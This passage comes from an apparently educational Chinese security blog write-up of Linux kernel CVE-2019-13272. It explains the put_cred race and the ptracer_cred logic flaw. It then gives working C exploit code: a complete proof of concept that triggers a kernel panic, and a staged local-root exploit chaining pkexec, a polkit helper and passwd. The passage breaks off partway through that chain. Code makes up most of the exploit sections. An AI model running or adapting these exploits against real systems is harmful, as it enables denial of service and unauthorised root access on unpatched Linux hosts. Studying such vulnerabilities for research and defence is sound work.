class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_cred</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *_cred)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> (<span class="keyword">struct</span> cred *) _cred;</span><br><span class="line"></span><br><span class="line">validate_creds(cred);</span><br><span class="line"><span class="keyword">if</span> (atomic_dec_and_test(&amp;(cred)-&gt;usage))</span><br><span class="line">__put_cred(cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其功能比较简单，一是调用 <code>validate_cred()</code> 验证 cred 是否合法，随后使用 <code>atomic_dec_and_test</code> 宏将 cred 的引用计数减一，并确认其引用计数是否为 0，若为 0 则调用 <code>__put_cred()</code></p><p>通常来说，在 commit_creds 两次减去引用计数（cred 一次，real_cred 一次）后最终执行流都会走到 <code>__put_cred()</code>，该函数定义于 <code>/kernel/cred.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __put_cred - Destroy a set of credentials</span></span><br><span class="line"><span class="comment"> * @cred: The record to release</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Destroy a set of credentials on which no references remain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *cred)</span><br><span class="line">&#123;</span><br><span class="line">kdebug(<span class="string">&quot;__put_cred(%p&#123;%d,%d&#125;)&quot;</span>, cred,</span><br><span class="line">       <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">       read_cred_subscribers(cred));</span><br><span class="line"></span><br><span class="line">BUG_ON(<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(cred) != <span class="number">0</span>);</span><br><span class="line">cred-&gt;magic = CRED_MAGIC_DEAD;</span><br><span class="line">cred-&gt;put_addr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">BUG_ON(cred == current-&gt;cred);</span><br><span class="line">BUG_ON(cred == current-&gt;real_cred);</span><br><span class="line"></span><br><span class="line">call_rcu(&amp;cred-&gt;rcu, put_cred_rcu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看到其一开始先验证 cred 的引用计数，随后调用 <code>call_rcu()</code>，该函数的作用可以简单理解为在 rcu 机制下调用函数指针，这里调用的是 <code>put_cred_rcu()</code> 函数，定义于 <code>/kernel/cred.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The RCU callback to actually dispose of a set of credentials</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cred_rcu</span><span class="params">(<span class="keyword">struct</span> rcu_head *rcu)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> container_of(rcu, <span class="keyword">struct</span> cred, rcu);</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;put_cred_rcu(%p)&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">if</span> (cred-&gt;magic != CRED_MAGIC_DEAD ||</span><br><span class="line">    <span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span> ||</span><br><span class="line">    read_cred_subscribers(cred) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with&quot;</span></span><br><span class="line">      <span class="string">&quot; mag %x, put %p, usage %d, subscr %d\n&quot;</span>,</span><br><span class="line">      cred, cred-&gt;magic, cred-&gt;put_addr,</span><br><span class="line">      <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">      read_cred_subscribers(cred));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with usage %d\n&quot;</span>,</span><br><span class="line">      cred, <span class="type">atomic_read</span>(&amp;cred-&gt;usage));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">security_cred_free(cred);</span><br><span class="line">key_put(cred-&gt;session_keyring);</span><br><span class="line">key_put(cred-&gt;process_keyring);</span><br><span class="line">key_put(cred-&gt;thread_keyring);</span><br><span class="line">key_put(cred-&gt;request_key_auth);</span><br><span class="line"><span class="keyword">if</span> (cred-&gt;group_info)</span><br><span class="line">put_group_info(cred-&gt;group_info);</span><br><span class="line">free_uid(cred-&gt;user);</span><br><span class="line">put_user_ns(cred-&gt;user_ns);</span><br><span class="line">kmem_cache_free(cred_jar, cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见其会判断 cred 的引用计数是否为 0，<strong>若不为 0 则会导致 kernel panic</strong>，在正常情况下则是常规的将 cred 释放回 cred_jar 这一 slub 的流程</p><p>看起来好像没什么问题，在进入释放函数前已有一次检查，想必没有可能引起 kernel panic，<strong>实则不然</strong>，我们考虑如下竞态场景：</p><ul><li>父进程不断地更新自身 cred</li><li>子进程不断地调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code></li></ul><p>在这种场景下，若是父进程在更新自身 cred 时，在父进程替换自身 cred 之前子进程获取到了父进程的旧 cred，在父进程进入到 <code>put_cred_rcu</code> 函数之后子进程刚好才将旧 cred 的引用计数 +1，此时便<strong>无法通过释放函数中的引用计数检查，从而造成 kernel panic</strong></p><h2 id="ptracer-cred-设置的逻辑错误导致本地提权"><a href="#ptracer-cred-设置的逻辑错误导致本地提权" class="headerlink" title="ptracer_cred 设置的逻辑错误导致本地提权"></a>ptracer_cred 设置的逻辑错误导致本地提权</h2><p>这个逻辑漏洞的利用在笔者看来<strong>十分巧妙</strong>，在正常情况下普通权限的 ptracer 确乎是无法调试执行 suid 程序的 pracee 的，但是 Jann Horn 提出了一个十分巧妙的<strong>多级 ptrace 方案</strong></p><p>我们现在来考虑如下场景：</p><ul><li>进程 A fork 出子进程 B</li><li>进程 B fork 出子进程 C</li><li>进程 B 执行一个<strong>先提权后降权的</strong> suid 程序</li><li>进程 C 检测到进程 B 提权后发起 <code>PTRACE_RTRACEME</code> 请求，随后执行一个 suid 程序，此时因为进程 B 已经提权所以 ptrace link 建立成功，<strong>此时进程 C 为 root 权限</strong></li><li>进程 A 检测到进程 B 执行 suid 程序后，主动 ptrace attach 进程 B</li><li>此时<strong>进程 B 已经完成降权，故进程 A 可以 ptrace 进程 B，而进程 B 已经与进程 C 建立了 ptrace link，此时进程 C 在判断进程 B 权限时使用的是此前保存的 root cred，故进程 B 可以 ptrace 进程 C 让其在 root 权限下执行恶意代码</strong></li></ul><p>听起来似乎需要一些条件竞争？而且我们似乎很难找到这样一个 suid 程序，<strong>这令这个漏洞变得十分的鸡肋</strong>，我们只能在一些特定发行版下完成利用</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><h2 id="利用竞态条件造成-kernel-panic"><a href="#利用竞态条件造成-kernel-panic" class="headerlink" title="利用竞态条件造成 kernel panic"></a>利用竞态条件造成 kernel panic</h2><p>前面我们已经讲到开两个进程进行竞争便能触发 kernel panic，而合法更新父进程的 cred 的方式有很多，例如 <code>setresuid</code> 这一系列的系统调用便能合法更新进程的 cred，这里我们便选用 setresuid 系统调用</p><p>exp 如下，这里参考了 jannh 给出的 poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">ptraceThread</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> child;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of kernel panic.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uid = getuid();</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            setresuid(uid, uid, uid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_create(&amp;child, <span class="literal">NULL</span>, ptraceThread, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/01/14/Cl1RPwcj5s8OLrf.png" alt="image.png"></p><p>可以看到的是我们成功利用该漏洞造成了 kernel panic</p><h2 id="利用逻辑错误进行本地提权"><a href="#利用逻辑错误进行本地提权" class="headerlink" title="利用逻辑错误进行本地提权"></a>利用逻辑错误进行本地提权</h2><p>我们先介绍一个新玩意——<code>PolKit</code>，这是一个应用程序框架，相比起 sudo 等传统特权授权程序，polkit 可以进行更细粒度的权限授予，这里不深入研究其用法</p><p>接下来我们需要用到一个大部分 Linux 桌面发行版都有的 suid 程序—— <code>pkexec</code>，这是 polkit 中的工具之一，其允许获得授权的用户以另一用户的身份执行特定程序，如下是我们将会用到的指令执行格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pkexec -user username some_programme_under_polkit</span></span><br></pre></td></tr></table></figure><p>当我们使用 <code>-user</code> 参数时， pkexec 会<strong>先将进程提权到 root，之后再降权到指定用户</strong>，这恰好可以用来构造我们 ptrace 利用链上的进程 B</p><p>此外，我们需要执行一个<strong>在 polkit 框架下运行的可执行程序</strong>（Jann Horn 称之为 helper），helper 需要满足的是<strong>普通用户执行时不需要认证</strong>（很多 polkit 程序执行时都需要弹窗认证）</p><p>接下来我们解决利用流程中条件竞争的问题，这里我们可以使用_管道_来控制程序执行的时机，从而让对应的三个进程能够在对应时机执行对应操作</p><p>下面我们分阶段对 exp 进行讲解，这里的 exp 笔者参考了 Jann 的exp 进行重新编写，经过笔者的一些<del>自以为是的</del>优化</p><h3 id="Setp-I-task-A-fork-task-B"><a href="#Setp-I-task-A-fork-task-B" class="headerlink" title="Setp.I task A fork task B"></a>Setp.I task A fork task B</h3><p>这里的 main 函数笔者设计为主要实现 task A 的功能，同时也作为后面 task B 与 task C 通过 execveat 替换自身镜像时的跳转入口</p><p>findHelper() 用以寻找当前平台可用的 helper，不再赘叙</p><p>task A 首先需要创建一个管道，后面我们需要将 task B 的 stdout 重定向至该管道以让其堵塞，因此我们需要将管道设为 <code>O_DIRECT</code> 模式，这意味着该管道传输数据的方式是按 “packet” 进行传输的，随后我们先往其中填充一个 packet，后面 task B 在写入  stdout 时便会堵塞（为什么要阻塞后面细说）</p><p>创建完成管道之后便 fork 出 task B，接下来我们来看 task B 的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="Step-II-task-B-fork-task-C"><a href="#Step-II-task-B-fork-task-C" class="headerlink" title="Step.II task B fork task C"></a>Step.II task B fork task C</h3><p>task B 主要的工作笔者都将其封装在 <code>middlePtracee()</code> 中，首先还是 fork 出 task C，<strong>此时 task A 与 task C 都在监视 task B 的状态</strong></p><p>接下来 task B 将自身的 stdin 重定向自 <code>/proc/self/exe</code> ，<strong>将 stdout 重定向至阻塞的管道</strong>，这是因为在接下来我们执行 pkexec 时，pkexec 的输出走 stderr，因此提权-&gt;降权这一流程并不会阻塞，而 pkexec 执行的 helper 的输出则走 stdout，<strong>此时程序会阻塞在这里，且 task B 已经降权，因此 task A 可以借此时机接管 task B</strong></p><p>重定向完成后便是常规的执行 <code>pkexec</code> 的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step-III-task-C-get-root"><a href="#Step-III-task-C-get-root" class="headerlink" title="Step.III task C get root"></a>Step.III task C get root</h3><p>task B 执行 pkexec 之后会提权到 root，当 task C 监视到 task B 执行 pkexec 后便调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code> 来获取 task B 的 root cred，<strong>从而令 task C 的 ptracer_cred 为 root cred</strong>，此时 task C 再执行一个 suid 程序便能以 root 权限执行，<strong>且仍保持着被 task B ptrace 的状态</strong></p><p>这里我们选择执行 <code>/usr/bin/passwd</code>，因为其会等待用户输入而不会直接退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step-IV-task-A-attach-task-B"><a href="#Step-IV-task-A-attach-task-B" class="headerlink" title="Step.IV task A attach task B"></a>Step.IV task A attach task B</h3><p>task A 在 fork 出 task B 之后便持续监视 task B 的状态，当 task B 执行 helper 时<strong>说明 task B 已经降权并阻塞，此时 task A 便有足够的权限 ptrace task B</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">       <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">       <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">           <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">       &#125;</span><br><span class="line">       comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       usleep(<span class="number">100000</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">   ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><h3 id="Step-V-get-privileged-by-multistage-ptrace-link"><a href="#Step-V-get-privileged-by-multistage-ptrace-link" class="headerlink" title="Step.V get privileged by multistage ptrace 